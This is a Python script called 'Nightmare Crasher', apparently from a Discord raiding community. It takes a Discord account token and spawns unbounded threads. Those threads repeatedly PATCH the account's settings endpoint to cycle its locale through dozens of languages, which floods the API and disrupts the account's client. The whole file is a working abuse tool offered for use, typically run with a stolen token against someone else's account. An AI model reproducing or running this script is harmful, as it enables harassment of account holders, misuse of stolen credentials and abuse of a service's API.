import requests
import os
import threading
import shutil
center = shutil.get_terminal_size().columns

lock = threading.Lock()
sent = 0

def Crash(token):
    global sent
    for i in('da', 'de', 'en-GB', 'en-ES', 'fr', 'hr', 'it', '1t', 'hu', 'n1', 'no', 'p1', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg', 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko'):
        r = requests.patch('https://discordapp.com/api/v8/users/@me/settings', headers={'Authorization': token, 'content-type': "application/json"}, json={'locale': i})
        if r.status_code == 200:
            lock.acquire()
            sent += 1
            print('\u001b[32m>\u001b[37m Sent Payload | %s' % (sent))
            lock.release()
        elif r.status_code == 401:
            print('\u001b[31m>\u001b[37mInvalid Token')    
            input()
            os._exit(0)

if __name__ == "__main__":
    os.system('cls & title [Nightmare Crasher] By Shade')
 
buh = '''
  ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███╗   ███╗ █████╗ ██████╗ ███████╗
  ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝████╗ ████║██╔══██╗██╔══██╗██╔════╝
██╔██╗ ██║██║██║  ███╗███████║   ██║   ██╔████╔██║███████║██████╔╝█████╗
██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██║╚██╔╝██║██╔══██║██╔══██╗██╔══╝
  ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║██║  ██║██║  ██║███████╗
  ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
'''
print('.gg/raid For Support    Shade#3421')
for line in buh.splitlines():
    print(f'\033[35m {line}'.center(center).replace("█",f"\033[0m█\033[35m"))

border = "\033[0m─"*center
print(border.center(center))
token = input('\u001b[32m>\u001b[37m Token: ')
while True:
        for i in range(100):
            threads = threading.Thread(target=Crash, args=(token,))
            threads.start()
